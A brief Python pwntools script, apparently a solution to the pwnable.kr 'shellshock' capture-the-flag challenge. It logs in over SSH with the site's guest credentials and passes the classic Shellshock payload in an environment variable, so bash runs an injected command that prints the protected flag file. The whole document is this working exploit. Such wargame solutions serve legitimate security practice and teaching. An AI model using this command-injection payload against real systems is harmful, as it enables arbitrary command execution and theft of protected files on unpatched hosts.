from pwn import *

session = ssh('shellshock', 'pwnable.kr', port=2222, password='guest')

# Standard shellshock
io = session.process('./shellshock', env={b'x':b'() { :;}; /bin/cat flag'})
print(io.recvline())
